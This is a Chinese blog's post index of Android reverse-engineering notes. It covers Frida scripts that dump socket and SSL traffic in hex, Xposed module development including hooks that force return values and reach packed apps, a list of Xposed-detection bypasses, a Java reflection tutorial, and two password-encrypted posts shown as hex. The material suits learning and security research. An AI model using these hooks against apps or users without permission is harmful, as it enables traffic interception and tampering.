回调捕获请求异常。同时，响应对象的 isSuccessful() 方法可以判断请求是否成功，通常结合 try-catch 进行更细致的错误处理。 hook12345678910111213141516171819202122232425262728293031function hookbaseurl ()&#123; Java.perform(function()&#123; Java.use(&quot;retrofit2.Retrofit$Builder&quot;).baseUrl.overload(&#x27;java.lang.String&#x27;).implementation = function(str)&#123; console.log(&quot;Entering 1&quot;) var result = this.baseUrl(str); console.log(&quot;result,str=&gt;&quot;,result,str) return result; &#125; Java.use(&quot;retrofit2.Retrofit$Builder&quot;).baseUrl.overload(&#x27;okhttp3.HttpUrl&#x27;).implementation = function(str)&#123; console.log(&quot;Entering 1&quot;) var result = this.baseUrl(str); console.log(&quot;result,str=&gt;&quot;,result,str) return result; &#125; &#125;)&#125;function hook_DailyNews()&#123; Java.perform(function()&#123; console.log(&quot;Entering java perform &quot;) Java.use(&quot;ganhuo.ly.com.ganhuo.mvp.entity.DailyNews&quot;).getDailyTitle.implementation = function()&#123; console.log(&quot;Entering getDailyNews&quot;) var result = this.getDailyTitle() console.log(&quot;result,str=&gt;&quot;,result) return result; &#125; &#125;)&#125;setImmediate(hook_DailyNews) SOCKET 自吐1234567891011121314151617181920212223242526272829303132333435363738function hook_socket()&#123; Java.perform(function()&#123; var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;);// 使用 ByteString 类来将数据转换为十六进制格式，以便更容易查看。 //代码重写了 java.net.SocketOutputStream 中的 socketWrite0 方法。 Java.use(&quot;java.net.SocketOutputStream&quot;).socketWrite0.implementation = function(fd,bytearray,int1,int2)&#123; var result = this.socketWrite0(fd,bytearray,int1,int2); console.log(&quot;socketWrite0 fd,bytearray,int1,int2,result =&gt; &quot;,fd,bytearray,int1,int2,result)// console.log(ByteString.of(bytearray).hex()); return result; &#125;//java.net.SocketInputStream 的 socketRead0 方法被重写。 Java.use(&quot;java.net.SocketInputStream&quot;).socketRead0.implementation = function(fd,bytearray,int1,int2,int3)&#123; var result = this.socketRead0(fd,bytearray,int1,int2,int3) console.log(&quot;socketRead0 fd,bytearray,int1,int2,int3,result =&gt;&quot;,fd,bytearray,int1,int2,int3,result) console.log(ByteString.of(bytearray).hex());//ByteString.of(bytearray).hex() 将读取的字节数组以十六进制显示，从而观察接收的数据 return result; &#125; &#125;)&#125;function hook_sslsocket()&#123;/该函数用于拦截 SSL socket 传输中的读写操作。SSL socket 是加密传输，通常用于 HTTPS 等场景。 Java.perform(function()&#123; //com.android.org.conscrypt.NativeCrypto 的 SSL_write 方法被重写。 var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;); Java.use(&quot;com.android.org.conscrypt.NativeCrypto&quot;).SSL_write.implementation = function(long,NS,fd,NC,bytearray,int1,int2,int3)&#123; var result = this .SSL_write(long,NS,fd,NC,bytearray,int1,int2,int3); console.log(&quot;SSL_write(long,NS,fd,NC,bytearray,int1,int2,int3),result=&gt;&quot;,long,NS,fd,NC,bytearray,int1,int2,int3,result) console.log(ByteString.of(bytearray).hex()); return result; &#125; Java.use(&quot;com.android.org.conscrypt.NativeCrypto&quot;).SSL_read.implementation = function(long,NS,fd,NC,bytearray,int1,int2,int3)&#123; var result = this .SSL_read(long,NS,fd,NC,bytearray,int1,int2,int3); console.log(&quot;SSL_read(long,NS,fd,NC,bytearray,int1,int2,int3),result=&gt;&quot;,long,NS,fd,NC,bytearray,int1,int2,int3,result) console.log(ByteString.of(bytearray).hex()); return result; &#125; &#125;)&#125;setImmediate(hook_sslsocket)","categories":[],"tags":[],"keywords":[]},{"title":"xposed","slug":"xposed","date":"2024-10-07T01:38:53.000Z","updated":"2024-11-14T11:30:33.011Z","comments":true,"path":"2024/10/07/xposed/","link":"","permalink":"http://example.com/2024/10/07/xposed/","excerpt":"","text":"介绍frida 和 objection 对于App 的修改仅仅只是单次性的，App重启之后，我们就又需要手动使用 frida 或 objection 对 App 进行注入。不过我们有 Xposed 框架，基于此框架开发插件，则可以对 App 实现永久性修改。 原理 ⼿机启动时init进程会启动所有Android进程的父进程——Zygote(孵化)进程。该进程的启动配置在/init.rc脚本中，而Zygote进程对应的执行文件是/system/bin/app_process，该文件完成类库的加载以及一些函数的调用工作。在Zygote进程创建后，再fork出SystemServer进程和其他进程。而Xposed Framework呢，就是用自己实现的app_process替换掉了系统原本提供的app_process，加载一个额外的jar包，然后入口从原来的com.android.internal.osZygoteInit.main()被替换成了de.robv.android.xposed.XposedBridge.main()，然后创建的Zygote进程就变成Hook的Zygote进程了，而后面Fork出来的进程也是被Hook过的。这个Jar包在/data/data/de.rbov.android.xposed.installer/bin/XposedBridge.jar。 Xposed_zygote进程启动后会初始化⼀些so⽂件（system&#x2F;lib system&#x2F;lib64），然后进⼊XposedBridge.jar中的XposedBridge.main中初始化jar包完成对⼀些关键Android系统函数的hook。 Hook则是利⽤修改过的虚拟机将函数注册为native函数。 然后再返回zygote中完成原本zygote需要做的⼯作。 Xposed组成：Xposed→C++音分，Xposed版的zygote，用于替换原生zygote，并为XposedBridge提供JNI方法，需由XposedInstaller在root后放到&#x2F;system&#x2F;bin目录下XposedBridge→Java部分，编译后会生成一个jar包，负责在Native层与Framework层法行交互；XposedInstaller→Xposed插件管理及功能控制的APP，包括启用、下载、禁用插仁等功能；XposedTools→用于译Xposed及XposedBridge; 衍生品太极Taichi Edxposed VA（virtual app）（2B） 平头哥 Riru: 提供了一种将代码注入到 zygote 进程的方法。 Zygisk: 是 Magisk 的一个模块，用于在系统启动时注入代码。 对比表格 特征&#x2F;框架 Xposed Framework EdXposed Framework LSPosed Framework 开发者 rovo89 多个开发者维护 乐星 支持系统 Android 7 及之前版本 Android 8 到 Android 11 Androids 10 和 Android 11、12、13 状态 停更，最后一版支持 Android 7 可能陷入停更危机，目前未能支持 Android 12 停更 2021.2.15 最后一次更新 活跃，可能成为 EdXposed 的替代品 停更 2024.1.8日宣布 特点 通过修改系统的 Dalvik 运行时实现 作为 Magisk 模块的一部分，在 Magisk 环境中安装和管理 对 Android 10 和 11、12和13的更好支持和优化，更好的兼容性，可以与 Magisk 一起使用 基于 原创 Xposed Framework Xposed Framework 代际 第一代 第二代 第三代 安装真机基本条件：手机已经root并且已经刷入第三方recovery 注意fastboot版本匹配首先下载并安装好XposedInstaller然后下载和手机cpu对应的Framework，并放在手机存储卡上然后重启到recovery模式，刷入Framework再重启即可 模拟器下载并安装好XposedInstaller 3.1.5 去搬移：Xposed所有版本下载地址 - 吾爱破解 - 52pojie.cn下载对应的framework xposed-v89-sdk25-x86 文件不存在就创建一下,(先看存不存在再去推入) 去雷神模拟器下使用它的adb 1adb push xposed-v89-sdk25-x86.zip /sdcard/Android/data/de.robv.android.xposed.installer/cache/downloads/framework 永久记住超级用户访问权限 xposed已激活 Xposed插件开发Xposed Framework API 初始化配置Xposed 插件也是以 App 的形式安装在系统中的，只是区别于普通 App 的开发，Xposed 插件的开发还需要一些特别的配置。 我们选择创建一个No Activity，语言选择Java，SDK选默认的API 25就可。 在 AndroidManifest.xml 中的 application 节点中增加如下 3 个meta-data属性，分别用于表示是不是 Xposed 模块、Xposed 模块的介绍以及支持最低的 Xposed 版本。 123456789101112&lt;application ...&gt; &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot; /&gt;&lt;!--是不是Xposed模块--&gt; &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;这是一个Xposed模块&quot; /&gt; &lt;!--Xposed模块介绍--&gt; &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;82&quot; /&gt; &lt;!--最低的Xposed版本--&gt;&lt;/application&gt; 在 App 工程的 settings.gradle 文件中进行如下添加，引入 API 语法提示。 12345678dependencyResolutionManagement &#123; repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories &#123; google() mavenCentral() maven &#123; url &#x27;https://api.xposed.info/&#x27; &#125; // 添加这一行即可 &#125;&#125; 进入我们app目录下的build.gradle，引入xposed的依赖 1234dependencies &#123; compileOnly &#x27;de.robv.android.xposed:api:82&#x27; //添加我 // compileOnly &#x27;de.robv.android.xposed:api:82:sources&#x27; // 不要导入源码，这会导致idea无法索引文件，从而让语法提示失效&#125; 还要在./app/src/main/res/values目录下创建arrays.xml，填入下面的内容,这一步主要是指定模块的作用域包名，效果就是在Lsposed中勾选作用域时会在应用下提示推荐应用。 12345678&lt;resources&gt; &lt;string-array name=&quot;xposedscope&quot; &gt; &lt;!-- 这里填写模块的作用域应用的包名，可以填多个。 --&gt; &lt;item&gt;ceui.lisa.pixiv&lt;/item&gt; &lt;item&gt;com.xjs.ehviewer&lt;/item&gt; &lt;item&gt;com.picacomic.fregata&lt;/item&gt; &lt;/string-array&gt;&lt;/resources&gt; 在 app&#x2F;src&#x2F;main ，新建一个assets文件夹。 目录下新建一个 xposed_init 文件用于指定 Xposed 模块入口类的完整类名。 在assets文件夹下新建文件xposed_init，文件类型选择text，文件内容填上你要新建的xposed类的名字。这个文件标记了你的xposed模块的入口。 模板： 对于在 xposed_init 文件中指定的 Hook 入口类，我们需要让该类实现 IXposedHookLoadPackage 接口，用于引入在安装 Xposed 框架的系统中。 123456789101112131415161718192021222324import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage; public class Xhook implements IXposedHookLoadPackage &#123; public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123; if(lpparam.packageName.equals(&quot;包名&quot;)) &#123; XposedHelpers.findAndHookMethod(&quot;类名&quot;, lpparam.classLoader,&quot;函数名&quot;, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; Boolean result = true;//默认返回true param.setResult(result); &#125; &#125;); &#125;; &#125;&#125; 由于每个 Zygote 孵化出来的 App 进程在启动时都会调用函数 handleLoadPackage()，此时如果想要 Hook 指定进程，就需要通过 handleLoadPackage 函数的参数 lpparam 进行过滤。lpparam 参数是一个 XC_LoadPackage.LoadPackageParam 类型的参数，它提供了一些有用的成员变量，用于表示应用进程的一些信息，其中主要成员类型信息如表： 成员变量类型 成员变量名 含义 String packageName 包名 String processName 进程名 ClassLoader classLoader 类加载器 ApplicationInfo appInfo 应用的更多信息 因此我们想要 Hook 指定进程，就可以通过 packageName 成员变量来进行筛选，之后再对进程进行 Hook 操作，这就涉及到 XposedHelpers 类，它本质上是封装了反射函数。 findAndHookMethod 是用于寻找并 Hook 指定函数的函数，它有如下两个重载函数： findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Object… parameterTypesAndCallback) findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object… parameterTypesAndCallback) 它们之间的区别仅在于类是否自动获取。值得一提的是，当存在重载函数时，可以额外在参数 methodName 后面添加参数的类型来指定某一重载函数的 Hook。 findAndHookMethod 函数中的参数 Callback 可以是一个抽象函数 XC_MethodHook，也可以是一个抽象函数XC_MethodReplacement。 在使用 XC_MethodHook 抽象函数时根据需求可实现如下抽象回调函数： beforeHookedMethod() ：通常用于获取和修改目标函数的参数类型和值。 afterHookedMethod()：通常用于获取和修改目标函数的返回值。 在使用 XC_MethodReplacement 抽象函数时需要实现如下抽象回调函数： replaceHookedMethod()：完全替换目标函数的功能。 常用API和写法类反射1Class clazz = XposedHelpers.findClass(&quot;类名&quot; ,lpparam.classLoader) 实例对象的获取123XposedHelpers.newInstance(Class&lt;?&gt; clazz, Object... args) XposedHelpers.newInstance(Class&lt;?&gt; clazz, Class&lt;?&gt;[] parameterTypes, Object... args)通过 3.2.3 Hook变量获取 Hook 变量静态变量Hook 12XposedHelpers.getStatic&lt;type&gt;Field(clazz, &quot;变量名&quot;)//获取变量值XposedHelpers.setStatic&lt;type&gt;Field(clazz, &quot;变量名&quot;, value)//修改变量值 实例变量Hook 12XposedHelpers.get&lt;type&gt;Field(obj, &quot;变量名&quot;)//获取obj对象中的指定变量的值XposedHelpers.set&lt;type&gt;Field(obj, &quot;变量名&quot;, value)//修改obj对象中的指定变量的值 Hook 函数123456//Hook普通函数(包括匿名函数和内部类函数)XposedHelpers.findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback) XposedHelpers.findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)//Hook构造函数XposedHelpers.findAndHookConstructor(Class&lt;?&gt; clazz, Object... parameterTypesAndCallback)XposedHelpers.findAndHookConstructor(String className, ClassLoader classLoader, Object... parameterTypesAndCallback) 主动调用静态函数调用 123//调用clazz类中的methodName方法，如果有参数则追加参数值，如果methodName方法是重载方法，则追加参数类型来指定目标函数XposedHelpers.callStaticMethod(Class&lt;?&gt; clazz, String methodName, Object... args);XposedHelpers.callStaticMethod(Class&lt;?&gt; clazz, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args) 实例函数调用 123//调用obj对象中的methodName方法，如果有参数则追加参数值，如果methodName方法是重载方法，则追加参数类型来指定目标函数XposedHelpers.callMethod(Object obj, String methodName, Object... args)XposedHelpers.callMethod(Object obj, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args); Hook加固App的真实逻辑123456789101112131415161718Class activityThreadClass = XposedHelpers.findClass(&quot;android.app.ActivityThread&quot;, lpparam.classLoader);XposedHelpers.findAndHookMethod(activityThreadClass, &quot;performLaunchActivity&quot;, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; super.afterHookedMethod(param); Application mInitialApplication = (Application) XposedHelpers.getObjectField(param.thisObject, &quot;mInitialApplication&quot;); ClassLoader finalLoader = mInitialApplication.getClassLoader(); XposedBridge.log(&quot;found classloader =&gt; &quot; + finalLoader.toString()); &#125;&#125;);//或者XposedHelpers.findAndHookMethod(Application.class, &quot;attach&quot;, Context.class, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; Context context = (Context) param.args[0]; ClassLoader classLoader = context.getClassLoader(); &#125; &#125;); Hook multiDex方法某些 App 对应的APK中可能是多dex的形式，以下是如何hook某一dex中的函数的代码： 1234567891011121314151617181920212223242526XposedHelpers.findAndHookMethod(Application.class, &quot;attach&quot;, Context.class, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; ClassLoader cl = ((Context)param.args[0]).getClassLoader(); Class&lt;?&gt; hookclass = null; try &#123; hookclass = cl.loadClass(&quot;类名&quot;); &#125;catch (Exception e)&#123; XposedBridge.log(&quot;未找到类&quot; + e.toString()); return; &#125; XposedHelpers.findAndHookMethod(hookclass, &quot;方法名&quot;, new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; //do something &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; //do something &#125; &#125;); &#125; &#125;); 遍历所有类下的所有方法首先需要 Hook loadClass() 方法获取反射得到的类，然后通过类的 getDeclaredMethods() 方法获取到类中的所有函数，接着就可以对目标函数进行 Hook。 1234567891011121314151617181920212223242526272829XposedHelpers.findAndHookMethod(ClassLoader.class, &quot;loadClass&quot;, String.class, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; super.afterHookedMethod(param); //获取反射得到的类 Class clazz = (Class) param.getResult(); String clazzName = clazz.getName(); //如果类名是目标类 if(clazzName.contains(&quot;类名&quot;))&#123; Method[] mds = clazz.getDeclaredMethods(); for(int i =0;i&lt;mds.length;i++)&#123; //获取方法的修饰符(pulic, static, final等) int mod = mds[i].getModifiers(); //去除抽象、native、接口方法 if(!Modifier.isAbstract(mod) &amp;&amp; !Modifier.isNative(mod) &amp;&amp;!Modifier.isAbstract(mod))&#123; XposedBridge.hookMethod(mds[i], new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); //do something &#125; &#125;); &#125; &#125; &#125; &#125; &#125;); 日志输出12XposedBridge.log(&quot;message&quot;);XposedBridge.log(new Exception());//打印堆栈 检测和绕过检测Java层检测：(1）通过PackageManager查看安装列表过滤(2）自造异常读取堆栈(3）检查关键字Java方法变成NativeJNI方法(4）反射读取XposedHelper类字段(5）检测方法是否被算改(6）检测包名native层检测：(1）解析&#x2F;proc&#x2F;self&#x2F;maps，搜检App自身加载的库中是否存在XposedBridge.jar、相关的Dex、Jar和so库等(2）XposedCheck的实现参考 绕过(1）Hook绕过绕过jar Class检测绕过堆栈检测绕过包名检测绕过jar文件检测绕过maps检测绕过vxp检测绕过S0检测绕过classPath检测检测缓存(2）定制源码绕过修改Xposed源码特征XposedInstaller、XposedBridge、Xposed、XposedTools全部修改指纹","categories":[],"tags":[],"keywords":[]},{"title":"java反射","slug":"java反射","date":"2024-10-06T12:59:14.000Z","updated":"2024-11-14T13:32:00.443Z","comments":true,"path":"2024/10/06/java反射/","link":"","permalink":"http://example.com/2024/10/06/java%E5%8F%8D%E5%B0%84/","excerpt":"","text":"什么是java反射机制Java 反射机制（Reflection）是一种在程序运行时动态地检查和操作类、方法、字段、构造函数等结构的技术。通过反射，程序可以在不知道对象具体类型的情况下，动态获取类的信息并操作对象。Java提供了一系列反射方法来操作（如获取、创建、修改、调用）Class对象、构造函数、方法、字段等。。本质是JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息 执行流程：Animal.java文件一一&gt;Animal.class文件一一&gt;类加载器加载到JVM中，JVM加载到内存中–&gt;Animal.class就会有个对象表示 常用对象的反射类反射Class类的实例表示正在运行的Java应用程序中的类和接口 获取class对象：第一种 使用class.forName （）静态方法：知道类的全路径名 第二种 使用 类名.class方法：适合在编译前知道操作的CLass： 第三种 使用 类对象.getClass（） 第四种 ClassLoader的loaderclass(ClassName)：动态加载类，ClassName指定要加载的类名。 123456789101112// 1. 使用 Class.forName() 动态加载类Class&lt;?&gt; clazz = Class.forName(&quot;com.example.MyClass&quot;);// 2. 使用 类名.classClass&lt;?&gt; clazz = MyClass.class;// 3. 使用 对象.getClass()MyClass obj = new MyClass();Class&lt;?&gt; clazz = obj.getClass();//4.ClassLoaderClass cl = ClassLoader.getSystemClassLoader().loadClass(&quot;com.example.MyClass&quot;); 通过类获取类实例 class.newInstrance()：执行无参构造获取类实例，该方法要求class类有无参构造方法。 1234//1.获取类Class cl = Class.forName(&quot;com.example.MyClass&quot;);//执行类的无参构造方法来获取类实例（必须要求该类含有无参构造方法）Object o = cl.newInstance(); 构造方法反射类的单个构造方法的信息以及对它的动态访问权限 获取构造方法 class.getConstructor(...ParameterTypes)：获取class类中的public权限的构造方法，ParameterTypes指定所获取的构造方法中的参数的类型，没有则表示无参。 class.getConstructors()：获取class类中的所有public权限的构造方法。 class.getDeclaredConstructor(...ParameterTypes) ：获取class类中的任意构造方法。 class.getDeclaredConstructors()：获取class类中的所有构造方法。 12345678910111213141516171819202122232425262728293031//1. 获取无参构造方法Constructor constructor = cl.getConstructor();System.out.println(constructor);/*输出：public com.example.uu.Test()*///2. 获取带一个参数且为string类型的构造方法Constructor constructor = cl.getConstructor(String.class);System.out.println(constructor);/*输出：public com.example.uu.Test(java.lang.String)*///3. 获取该类的所有构造方法Constructor[] constructors = cl.getConstructors();for (Constructor con:constructors) &#123; System.out.println(con); System.out.println(con.getName() + &quot;||&quot; + con.getModifiers() + &quot;||&quot; + Arrays.toString(con.getParameters()) + &quot;||&quot; + Arrays.toString(con.getParameterTypes()));&#125;/*输出public com.example.uu.Test(java.lang.String)com.example.uu.Test||1||[java.lang.String arg0]||[class java.lang.String]public com.example.uu.Test()com.example.uu.Test||1||[]||[]*/ 通过构造方法获取类实例 constructor.newInstance(...args)：通过constructor构造方法构造类实例对象，根据获取到的constructor构造方法来决定是否需要传入参数args。 constructor.setAccessible(bool)：设置constructor构造函数的访问权限，若bool为true则表示取消构造函数的访问权限控制，这意味着private声明的构造函数也可以进行访问。 123456789//1.无参构造Class cl = Class.forName(&quot;com.example.uu.Test&quot;);//获取类Constructor constructor = cl.getConstructor();//通过类获取无参构造方法Object o = constructor.newInstance();//执行构造方法获得类实例//2.有参构造Class cl= Class.forName(&quot;com.example.uu.Test&quot;);//获取类Constructor constructor = cl.getConstructor(String.class);///获取带一个参数且参数类型为String类型的构造方法Object obj = constructor.newInstance(&quot;aaaaaaaaaaaaaaaa&quot;);//执行构造方法获得类实例 字段反射Field提供有关类或接口的单个字段信息以及动态访问权限 获取字段 class.getField(FieldName) ：获取class类中的带public声明的FieldName变量。 class.getFields()：获取class类中的带public声明变量。 class.getDeclaredField(FieldName)：获取class类中的FieldName变量。 class.getDeclaredFields()：获取class类中的所有变量。 1234567891011121314151617//1. 获取该类的publicStr字段Field field = cl.getField(&quot;publicStr&quot;);//只能获取public声明的变量，获取privateStr失败System.out.println(field);/*输出：public java.lang.String com.example.uu.Test.publicStr*///2.获取该类中所有字段Field[] declaredFields = cl.getDeclaredFields();for(Field dec : declaredFields)&#123; System.out.println(dec);&#125;/*public java.lang.String com.example.uu.Test.publicStrprivate java.lang.String com.example.uu.Test.privateStrcom.test.wtf.Dog com.example.uu.Test.dog*/ 操作字段 field.getXxx(obj)：获取obj对象的field字段的属性值。Xxx代指8个基本数据类型，如果该属性类型是引用类型则直接使用Field.get(obj)。 field.setXxx(obj, value)：将obj对象的Field字段赋值为value。Xxx代指8个基本数据类型，如果该字段类型是引用类型则直接使用Field.set(obj, value)。 field.setAccessible(bool)：设置field字段的访问权限，若bool为true则表示取消字段的访问权限控制，这意味着private声明的字段也可以进行访问。 12345678910111213141516171819//1.获取类Class cl= Class.forName(&quot;com.example.uu.Test&quot;);//2.获取构造函数Constructor constructor = cl.getConstructor(String.class);//3.创建类对象Object newtest = constructor.newInstance(&quot;ousasf&quot;);//4.获取privateStr字段Field privateStr = cl.getDeclaredField(&quot;privateStr&quot;);//5.因为该字段是Private权限，所以需要取消属性的访问权限控制privateStr.setAccessible(true);System.out.println(privateStr.get(newtest));//6.修改privateStr字段的值privateStr.set(newtest,&quot;ahlsdfjpasp&quot;);System.out.println(privateStr.get(newtest));/*输出：abcahlsdfjpasp*/ 方法反射Method提供关于类或接口上单独某个方法的信息 获取方法 class.getMethod(MethodName,...ParameterTypes)：获取class类中的public权限的方法，MethodName指定所要获取的方法的方法名，ParameterTypes指定所获取的方法中的参数的类型，没有则表示无参。 class.getMethods()：获取class类中所有public权限的方法。 class.getDeclaredMethod(MethodName,...ParameterTypes)：获取class类中任意方法。 class.getDeclaredMethods()：获取class类的所有方法。 123//获取带一个参数的且为int类型的getPublicStr方法Method method = cl.getMethod(&quot;getPublicStr&quot;,int.class);System.out.println(method); 执行方法 method.invoke(obj,...args)：调用obj对象的method方法，args指定传入的参数，没有则表示无参。 method.setAccessible(bool)：设置method方法的访问权限，若bool为true则表示取消方法的访问权限控制，这意味着private声明的方法也可以被调用。 123456789101112131415161718//1.获取类Class cl= Class.forName(&quot;com.example.uu.Test&quot;);//2.获取带一个参数且为String类型的构造方法Constructor constructor = cl.getConstructor(String.class);//3.通过构造方法，构造类对象Object newtest = constructor.newInstance(&quot;abcdedfg&quot;);//4.获取getPublicStr()方法Method method = cl.getDeclaredMethod(&quot;getPublicStr&quot;);System.out.println(method);//5.取消访问控制//method.setAccessible(true);//6.调用该方法System.out.println(method.invoke(newtest));/*输出：public java.lang.String com.example.uu.Test.getPublicStr()abcdedfg*/","categories":[],"tags":[],"keywords":[]},{"title":"加固","slug":"加固","date":"2024-09-28T07:04:39.000Z","updated":"2024-11-06T13:09:47.312Z","comments":true,"path":"2024/09/28/加固/","link":"","permalink":"http://example.com/2024/09/28/%E5%8A%A0%E5%9B%BA/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c6673eb88a5d13d3bd99379faedd8762e8677d85b137bbfde04d2d4699e855ee3852dc50576f5f521532826c51032ba7b0126e72b18e6d6a949fe2606be2ccd001818b5ef116fa138d96a4faa0fc258214f71ec9cc49b210a3b2f7014510705e3f9c6ec81574dbbc7ba31cf1551a17174435c1fb5211795dc1ffd49680a76730c071222deeea5d3c4b2dec8c07f94e796d854416a0536bc204e174721da7d206311b2533a295c4ad4c61be64edabf40cbd34347aef9163156201b44218402a98ba942045481c2675bd886d0d4f542404e443f78435072873727bac47a49c68eecae3903746c52087f785abf309012544dbdc6facb4e0fcc05b3715c3ba54e2fbecfb4bb336225a33ac48904ec0f2d81051136732887ab4b12cf516036d5f19a3588683232ff9043c8a51101a39689953443a519b717213afd9db81fb20d64abd9b7 您好, 这里需要密码.","categories":[],"tags":[],"keywords":[]},{"title":"shell","slug":"ke","date":"2024-09-28T06:29:53.000Z","updated":"2024-11-11T09:25:16.198Z","comments":true,"path":"2024/09/28/ke/","link":"","permalink":"http://example.com/2024/09/28/ke/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c66f63ff4446f79fd1f5ecd8d03847f2564b21ad1fe86c5c010bb0fde8494da3ab5ac29e39157d3e13adcb6d8fe56716b5d23e7411e161dbf892b48cd395ea94e6924c3858417c338bb191aa8c56b75d4dc987b16de4472f592964b7b5748ddbb336f167ce8eb039385cd1ab091ae8bc9401c2e3f56d83521cf9d2eec9c9ad398884385af106286f0d3b7ce24078aaab58e56f392618b8a2f2d129234c1acd302deffb66d715447fef55113d0d13f4f4c8347ffdd3e9c670c3e906c30c7280881c9f94595955626c661317f194e1b933c19c22cb652d05461d04d11a022b3a812868b170a4fc7e31a4fdf41bef408c97240ff9f5f1ab13ccefbeddbf52a477b9241123b022f1851643bb56cabb4e14a63f2ad60938611fa366817bc263af5c789995df01ec464a87e9cf44ec912256cb04e3d55f810e4e617e1a4600be34aa2f773e0e2695001e9c3b018a0fe4a31cb9601e88a160b7569e6feb09d466ce3ea2beed12f59efc9c8d88678058ab769c99241625b24b22f5186cd98f41910312ef1b43db5341c2d459956052bad94f7b01e939e8700ded0de02bc59bc74c14a9cf93342998274abd82193e0f1e152bbf2ef23008f3067732477af4146b3254c2a33334267ff58b166cbf3553fdb306b220841a842cac057a494a20469d7d224382580956fb622df03c8ba2dbce135dcdce7f5fc93d1fd1e1f1cbbe3f53a481c854eb7d9c879dae00dd3a7461b134e7a1cedc79e727e4a162c428860eb34bed7068aad02861afe26778f89c667e63f3b8bf9ec8ed835b9d4f198a601db4232b0b185e274a342d6d7f500702f26bae5c8d8626f7a467778fa39b1d4f72648bf17059af00f8b2f6c5dae0ea46252815fc07c4023d71a8ac33990108e017ca034b3f16721f182653f277a285cc5bc269fedd6fe554efafddef71cd809edc47d1b8d9cac9f7ce084b8c47bf59336db64efb634475de3dc844a3782511d8d28dde1b0f5c3a191a2a29d925c3197718c992dacea449d399ed36b862de55ec0a3f5a2d63e6b86865fc0663c82344406bd7dc6034485aa848f78aa581e3ce060bef68baede8708722c6a3634cc6e030361143db40f935ae35ce1716701771cf7f3df0ac76c5ddb3c89516c55f5a4b6b65303ff586fee66062c8741ebbf5cc5a764a6fd885a1d7828932824021107866f3d48bb57e0ba6cb86b51287c80260cb26fc9e958ea1eeb5db8f9556625f7e9336349b9879350519dc5654d65d4c19f04c5995de5e7e463dfd2c5568b3953cd6a8cf0cc6cd21819e9b6fd6e7c1876568d38af67a260e5979a869c78891ff333e4310c124408a2dd9f278899df971646e66028e8b06c1664cf21877d08f24a8f62a83320aabd8219851ce9ad048fe333df25e3fd1ab164cc2f800fd195178d7adab214df6b5105a255031bea3ed0e6b0cddaab4f572b2d71bd80806e32da59ede544143617ed3302c765462353975dd6a7d83d9f601b1faf8472b024610d791607b4e50569ae5aea6a45944b03cbdd3d5f8f880b4005f57e27921bfb06edb9ad4a321403fbed56ba9ad7e71074d59b500b004343bcdc77f912cffc307331cc6f492c1833a0ee6213afc4c66a7d69d6d47cbcf9cc236ed38ec873fb80497aa6dab3c8d4d0c1ddb717f72cc157fc519bac43cd9695fbcf3158157538f222cbc7eadc101e6e812bb83bd1fc1ab0a661b7807dbcd682e0b6be0f815965701f00433bad00ce7e7268e710995dd13eaf96977a18f9cd53fbce667cc065cecbee28514a575afddca315d8ee9f0a6e2c24839a1a1ba79e3e807805587e1dc26705feeaf6236398409285c44991568aad64d48f56f1de54aa91635491923ac4d12ad47de70528a20f8147ae55a00104dd099b03c7b363a5db79b1e188414a1edc8cb117db65611505d51bea309f092f5e76a6ca23e22db235b29ae0ca6368280c5a4a19b829857bd02ec0bfb5da8076a80cf51fca2c6d68a1a4492f9e264dc79d9a67a7185bba2ee1d333addc043fd5832b59e2194f2a8eba09a6ee9dffd6d58b59f496308dc49975d1668f8524892647272e73d235fea6e35fbebeafffa9329cd0ee4106fa9e8238465c8c429f09efc12615f7776c13dd5817881a4fc469bf72b45e8a6589fb7a88191b90279dcf339f9d5d8d1022a257a479ce86af90ade24f9b810e6b631bac3b384f334c4624e1c42c55bd3ec1258cca7d5cf848a6dd65c002e1bdca8753098cc306fdce13fab97fbf425c7588f19986eb857eb2fd8856b934431af5294f6b69723ea27e8cfa753d388a1c1deee49c9fda5cb193d4bf820971e07ffb062fd902be1f125d5a233a8ab0600d8ba8a04d9e633d1d206e517c58f8c1d71d19256228cf21df7d1f0990cfa615f50d0fb43f180a8a461151a849135713eaf48e626d8ed42ecd402d6164b8563a7372160b55b3c27e9a6ab817edf3981bff90270755112cecbd10127ca1a178bd58ca2d0c67f2812c9886f07710c4455e616929c29db4c7b917f0427cebec7d5abbe386c299cadda1a4a1930763a371fc5e0121e45e04064e25f69a299b03fde12f78a11778cd1f0e46f784e0aba1f69c12662479ac942faa2eca7dee96fa8103848aeb4eb62576f779326f2b7a19da532a521d58a7ab89c590e1accf6c066cbe83e80f924e04db08508c7e0620a3405314003f6dcaa3b25e0348fd1e353de2408a0d3859a